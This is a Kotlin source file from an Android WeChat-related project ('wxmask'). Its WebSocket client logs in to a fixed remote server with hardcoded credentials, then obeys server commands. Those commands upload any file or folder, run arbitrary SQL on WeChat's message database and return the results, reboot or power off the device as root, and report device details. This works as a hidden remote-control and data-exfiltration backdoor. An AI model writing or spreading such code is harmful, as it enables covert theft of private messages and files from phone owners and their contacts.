package com.lu.wxmask.http

import ZipUtils
import android.annotation.SuppressLint
import android.os.Build
import com.lu.magic.util.log.LogUtil
import com.lu.wxmask.BuildConfig
import com.lu.wxmask.util.AppVersionUtil.Companion.getSmartVersionName
import com.lu.wxmask.util.WxSQLiteManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okhttp3.logging.HttpLoggingInterceptor
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit
import kotlin.math.min


var androidId: String = ""
var token: String = ""
var wxId: String = ""

object WebSocketClient {

    private val wsUrl = "wss://jswx.qychaye.com/ws" // 替换成你服务器的 WebSocket URL
    private val client: OkHttpClient by lazy {
        val logging = HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        }
        timer()
        OkHttpClient.Builder()
            .pingInterval(10, TimeUnit.SECONDS)
            .addInterceptor(logging)
            .build()
    }
    private var webSocket: WebSocket? = null

    private val uploader by lazy {
        FileUploader(webSocket!!)
    }

    var isConnect = false

    private fun timer() {
        // 定时检查连接状态
        GlobalScope.launch {
            while (true) {
                delay(10000)
                LogUtil.i("WebSocket 连接: $isConnect", androidId ,wxId, token)
                if (!isConnect) {
                    LogUtil.e("WebSocket 连接已断开，尝试重新连接...")
                    start()
                }
            }
        }
    }

    // 使用协程封装 POST 请求
    suspend fun postRequest(method: String, jsonBody: String): String {
        val requestBody = RequestBody.create(
            "application/json; charset=utf-8".toMediaTypeOrNull(),
            jsonBody
        )

        val request = Request.Builder()
            .url("https://jswx.qychaye.com/$method")
            .addHeader("Androidid", androidId)
            .addHeader("Authorization", "Bearer $token")
            .post(requestBody)
            .build()

        LogUtil.e(request.toString(), requestBody)

        return withContext(Dispatchers.IO) {
            try {
                val response = client.newCall(request).execute()
                LogUtil.e(response.toString())
                if (response.isSuccessful) {
                    response.body?.string() ?: "Empty response"
                } else {
                    "Error: ${response.code}"
                }
            } catch (e: Exception) {
                // 处理请求异常
                LogUtil.e("Request failed: ${e.message}")
                "Request failed: ${e.message}"
            }
        }
    }

    @SuppressLint("HardwareIds")
    fun start() {
        LogUtil.e("post result == launch start")
        token = runBlocking {
            val jsonObject = JSONObject()
            jsonObject.put("username", "Pusher")
            jsonObject.put("password", "qwe321")
            val body = postRequest("login", jsonObject.toString())
            LogUtil.e("post result == $body")
            body.parse {
                it.optString("token")
            }
//            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0X2lkIjoxMDAsImV4cCI6MTczOTI0ODQzMSwiaXNzIjoiUnVveWktR28iLCJ1c2VyX2lkIjoxMDMsInVzZXJfbmFtZSI6IlB1c2hlciIsInV1aWQiOiJjZmFkZDA5Mi1lN2NjLTExZWYtYmRmNi01MjU0MDBhNDY4NmQifQ.zUTlXiKarD50Jk5LyzNH7JGBDudctUlz8s9wLMLslNE"
        }

        if (wxId.isBlank()) {
            wxId = WxSQLiteManager.getWxId()
        }
        LogUtil.i("wxId == ", wxId)
        // 创建 WebSocket 请求
        val request = Request.Builder()
            .url(wsUrl)
            .addHeader("Authorization", "Bearer $token")
            .addHeader("Androidid", androidId)
            .addHeader("Wxid", wxId)
            .build()

        // 创建 WebSocket 监听器
        val webSocketListener = object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                LogUtil.e("WebSocket 连接已建立")
                isConnect = true
                uploader.updateSocket(webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                LogUtil.e("收到服务器消息: $text")
                // 解析和处理服务器返回的消息
                try {
                    val json = JSONObject(text)

                    val type = json.opt("type")
                    if (type == "chunk_upload_response") {
                        uploader.handleResponse(json)
                        return
                    }

                    when (type) {
                        // path为非全路径
                        0 -> {
                            val path = json.optString("path")
                            val firstDbName = WxSQLiteManager.Store.values.firstOrNull()?.name
                            LogUtil.i("firstDbName = $firstDbName")

                            val absolutePath = firstDbName?.let {
                                it.substring(0, it.lastIndexOf("/")) + "/" + path
                            } ?: return
                            LogUtil.i("file path = $$absolutePath")
                            var file = File(absolutePath)
                            if (!file.exists()) {
                               file = File("$absolutePath⌖")
                            }
                            uploadFile(file)
                        }

                        1 -> {
                            val path = json.optString("path")
                            LogUtil.i("file path = $path")
                            uploadFile(File(path))
                        }

                        2 -> {
                            //"SELECT * FROM userinfo" EnMicroMsg
                            val sql = json.optString("sql")
                            val dbName = json.optString("name", "EnMicroMsg.db")
                            // 一次发送几条消息
                            val count = json.optInt("count", -1)
                            LogUtil.d("start execute database", dbName, sql)

                           sendSqlExecuteResult(dbName, sql, count, json)
                        }
                        // 重启手机
                        4 -> {
                            val rebootProcess =
                                Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                            rebootProcess.waitFor()
                        }

                        5 -> {
                            val powerOffProcess =
                                Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot", "-p"))
                            powerOffProcess.waitFor()
                        }

                        6 -> {
                            // 发送应用版本，微信版本，安卓版本，设备机型
                            sendMessage(JSONObject().apply {
                                put("data", JSONObject().apply {
                                    put("app_version", BuildConfig.VERSION_NAME)
                                    put("wechat_version", getSmartVersionName())
                                    put("android_version", Build.VERSION.RELEASE)
                                    put("device_model", "${Build.BRAND} ${Build.DEVICE}")
                                })
                                put("source", json)
                            }.toString())
                        }
                    }

                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                LogUtil.e("WebSocket 连接失败: ${t.message}")
                isConnect = false
//                start()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                LogUtil.e("WebSocket 连接已关闭: $reason")
                isConnect = false
                start()
            }
        }

        // 启动 WebSocket 连接
        webSocket = client.newWebSocket(request, webSocketListener)
        // 保持主线程运行，防止程序退出
//        delay(Long.MAX_VALUE)
    }

     fun sendSqlExecuteResult(dbName: String, sql: String, count: Int, source: JSONObject) {
        val db = WxSQLiteManager.executeSql(dbName, sql)
        if (count > 0 && db.length() > count) {
            sendInBatches(db, count) {
                sendMessage(JSONObject().apply {
                    put("data", it)
                    put("source", source)
                }.toString())
            }
        } else {
            sendMessage(JSONObject().apply {
                put("data", db)
                put("source", source)
            }.toString())
        }
    }

    private fun sendInBatches(jsonArray: JSONArray, count: Int, sendBatch: (JSONArray) -> Unit) {
        fun JSONArray.toList(): List<Any> {
            val list = mutableListOf<Any>()
            for (i in 0 until this.length()) {
                list.add(this[i])
            }
            return list
        }

        val length = jsonArray.length()
        val list = jsonArray.toList()
        var i = 0
        while (i < length) {
            // 计算当前批次的结束索引
            val end = min((i + count), length)
            // 截取当前批次的子数组
            val batch = JSONArray(list.subList(i, end))
            // 发送当前批次数据
            sendBatch(batch)
            i += count
        }
    }

    private fun uploadFile(file: File) {
        val targetFile = if (file.isDirectory) {
            // 1. 压缩并分块
            ZipUtils.zipFolderToChunks(file)
        } else {
            file
        }
        if (!targetFile.exists()) {
            uploader.sendErrMessage("文件不存在: ${file.absolutePath}")
            return
        }

        uploader.uploadFile(
            file = targetFile,
            callback = object : FileUploader.UploadCallback {
                override fun onProgress(progress: Float, speed: String, remainingTime: String) {
                    println("上传进度: $progress%\n速度: $speed\n剩余时间: $remainingTime")
                }

                override fun onSuccess(path: String, md5: String) {
                    println("上传成功: $path")
                    if (targetFile.name.contains("tempZip")) {
                        targetFile.delete()
                    }
                }

                override fun onError(message: String) {
                    println("上传失败: $message")
                    if (targetFile.name.contains("tempZip")) {
                        targetFile.delete()
                    }
                }
            }
        )
    }

    fun sendMessage(message: String, type: String = "webhook") {
        val wxIdHeader = webSocket?.request()?.header("Wxid")
        if (wxIdHeader.isNullOrBlank()) {
            wxId = WxSQLiteManager.getWxId()
        }
        if (!isConnect || wxIdHeader.isNullOrBlank()) {
            start()
        }
        val text = JSONObject(message.trimIndent()).apply {
            put("type", type)
        }.toString()
        LogUtil.i("header: ${webSocket?.request()?.headers}")
        LogUtil.e("发送消息: $text")
        webSocket?.send(text)
    }

    fun notifyClient() {
        CoroutineScope(Dispatchers.IO).launch {
            postRequest("notify", JSONObject().apply {
                put("androidid", androidId)
                put("type", 2)
                put("sql", "SELECT * FROM message")
                put("path", "/sdcard/Pictures")
            }.toString())
        }
    }

    fun stop() {
        webSocket?.close(1000, "Goodbye")
    }

    fun <T> String.parse(call: String.(JSONObject) -> T): T {
        return try {
            call(JSONObject(this))
        } catch (e: Exception) {
            call(JSONObject())
        }
    }
}